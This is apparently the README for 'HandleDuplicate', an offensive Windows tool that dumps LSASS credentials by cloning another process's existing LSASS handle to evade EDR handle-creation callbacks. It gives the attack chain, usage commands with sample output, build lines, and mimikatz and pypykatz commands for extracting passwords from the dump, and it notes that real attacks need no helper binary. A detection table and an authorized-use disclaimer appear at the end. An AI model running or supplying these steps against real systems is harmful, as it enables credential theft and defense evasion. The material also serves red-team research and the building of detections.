# HandleDuplicate — LSASS Handle Duplication

> Dump LSASS credentials by duplicating an **existing** handle from another process — never calling `OpenProcess()` on LSASS directly.

---

## How It Works

Most LSASS credential dumping tools call `OpenProcess()` to obtain a handle to `lsass.exe`. Modern EDRs intercept this via the kernel callback `ObRegisterCallbacks`, which inspects every handle-creation request targeting LSASS and can strip access rights or block it entirely.

**This technique sidesteps that by never opening a handle to LSASS at all.**

Instead, it exploits the fact that many Windows processes already hold legitimate handles to LSASS during normal operation — services like `svchost.exe`, AV agents, backup tools, and more. The attack chain:

1. **HandleHolder** opens a handle to LSASS with `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ` and keeps it alive.  
2. **HandleDup** enumerates all system handles using `NtQuerySystemInformation(SystemHandleInformation)`.  
3. It identifies handles belonging to other processes that point to LSASS.  
4. It calls `NtDuplicateObject()` to clone a suitable handle into its own process.  
5. It passes the cloned handle to `MiniDumpWriteDump()` to produce a full memory dump.

The critical point: no `OpenProcess(lsass.exe)` call is made by the dumping tool, so kernel-level handle-creation callbacks targeting LSASS are bypassed.

---

## Why Two Binaries?

| Binary | Purpose |
|---|---|
| **HandleHolder.exe** | Simulates a legitimate process that holds an open handle to LSASS. In a real environment, you wouldn't need this — there are already Windows services holding LSASS handles. This tool is provided so you can test the technique in a controlled environment. |
| **HandleDup.exe** | The actual attacker tool. It discovers processes that hold LSASS handles, duplicates one, and dumps LSASS memory. |

In a real attack scenario, you would skip HandleHolder entirely and use `HandleDup.exe --auto` to find naturally occurring LSASS handles held by system services.

---

## Usage

### Step 1 — Run HandleHolder (Terminal 1)

Open an **elevated** (Administrator) command prompt:

```
HandleHolder.exe
```

Output:
```
=== HandleHolder — LSASS Handle Simulator ===

[+] SeDebugPrivilege enabled
[+] LSASS PID: 908
[+] Opened handle to LSASS: 0x0000000000000088
[+] Handle value: 0x88
[+] Access: PROCESS_QUERY_INFORMATION | PROCESS_VM_READ (0x1410)

[*] Holding handle open. This PID: 12345
[*] Now run HandleDup.exe in another elevated terminal
[*] Press Enter to release handle and exit...
```

> **Do not press Enter yet.** Leave this running.

<!-- Screenshot: HandleHolder.exe running and holding the handle -->

### Step 2 — Recon with HandleDup (Terminal 2)

Open a **second elevated** command prompt:

```
HandleDup.exe --recon
```

This lists all processes currently holding a handle to LSASS:

```
=== HandleDup — LSASS Handle Duplication ===

[+] NT APIs resolved successfully
[+] SeDebugPrivilege enabled
[+] LSASS PID: 908
[+] Enumerated 54312 system handles
[*] Searching handles (LSASS PID: 908)...
[+] Found LSASS handle! Source: HandleHolder.exe (PID 12345), Handle: 0x88, Access: 0x1410
[+] Found 1 LSASS handle(s)

=== RECON RESULTS ===
  [1] PID: 12345 (HandleHolder.exe), Handle: 0x88, Access: 0x1410
```

<!-- Screenshot: HandleDup.exe --recon output showing discovered handles -->

### Step 3 — Dump LSASS (Terminal 2)

**Option A** — Auto-discover and dump:
```
HandleDup.exe --auto --out C:\Temp\lsass.dmp
```

**Option B** — Target a specific source PID:
```
HandleDup.exe --pid 12345 --out C:\Temp\lsass.dmp
```

Output:
```
[*] Using first suitable handle for dump...
[*] Source: HandleHolder.exe (PID 12345), Cloned Handle Access: 0x1410
[*] Dumping LSASS (PID: 908) to: C:\Temp\lsass.dmp
[+] LSASS dump complete: C:\Temp\lsass.dmp
[+] Dump size: 59432960 bytes (56.68 MB)

[+] SUCCESS — Dump written to: C:\Temp\lsass.dmp
```

<!-- Screenshot: HandleDup.exe --auto dump output -->

### Step 4 — Parse the Dump

```
mimikatz # sekurlsa::minidump C:\Temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Or with pypykatz:
```
pypykatz lsa minidump C:\Temp\lsass.dmp
```

<!-- Screenshot: Credential extraction from the dump -->

---

## Build

### MinGW (x86_64)

```bash
# HandleHolder
x86_64-w64-mingw32-g++ -o HandleHolder.exe HandleHolder.cpp -static

# HandleDup
x86_64-w64-mingw32-g++ -o HandleDup.exe HandleDup.cpp -ldbghelp -lntdll -static
```

### MSVC

```bash
# HandleHolder
cl /EHsc HandleHolder.cpp

# HandleDup
cl /EHsc HandleDup.cpp /link dbghelp.lib ntdll.lib
```

---

## How EDRs Can Detect This

| Detection Vector | Description |
|---|---|
| **`NtQuerySystemInformation` monitoring** | The tool calls `NtQuerySystemInformation(SystemHandleInformation)` to enumerate all open handles on the system. This is uncommon behavior and can be flagged by user-mode API hooks or ETW telemetry. |
| **`NtDuplicateObject` to LSASS handles** | The kernel `ObRegisterCallbacks` can also intercept `OB_OPERATION_HANDLE_DUPLICATE` operations. If the EDR checks whether the **target** of a duplicated handle is LSASS, even indirect handle access can be blocked. |
| **`MiniDumpWriteDump` call** | The use of `dbghelp!MiniDumpWriteDump` is a well-known credential dumping indicator. EDRs can hook this API or monitor for the creation of minidump files. |
| **SeDebugPrivilege usage** | Enabling `SeDebugPrivilege` is a prerequisite for this technique. Token privilege adjustments are logged and can trigger alerts. |
| **Handle access rights audit** | Even when duplicating, the cloned handle carries access rights. EDRs can inspect post-operation handle grants to LSASS and flag unexpected processes. |
| **Process behavior analysis** | A process that enumerates all system handles, opens other processes with `PROCESS_DUP_HANDLE`, and then writes a large file is a strong behavioral signal. |

---

## MITRE ATT&CK

| ID | Technique |
|---|---|
| T1003.001 | OS Credential Dumping: LSASS Memory |
| T1106 | Native API |

---

## Files

```
HandleDuplicate/
├── README.md
├── native/
│   ├── HandleHolder.cpp    # Handle holder (simulates a service)
│   └── HandleDup.cpp       # Handle duplicator + LSASS dumper
└── bin/
    ├── HandleHolder.exe    # Pre-built (x64)
    └── HandleDup.exe       # Pre-built (x64)
```

---

## Requirements

- Windows 10/11 (x64)
- Administrator privileges (SeDebugPrivilege)
- LSASS must not be running as PPL (Protected Process Light) — or you need a PPL bypass

---

## References

- [HandleKatz](https://github.com/codewhitesec/HandleKatz) — Original PIC shellcode implementation by Code White
- [NtQuerySystemInformation - SystemHandleInformation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation)
- [ObRegisterCallbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks) — Kernel mechanism used by EDRs to protect LSASS

---

> **Disclaimer:** This tool is intended for authorized security testing and research only. Unauthorized credential dumping is illegal. Use responsibly.
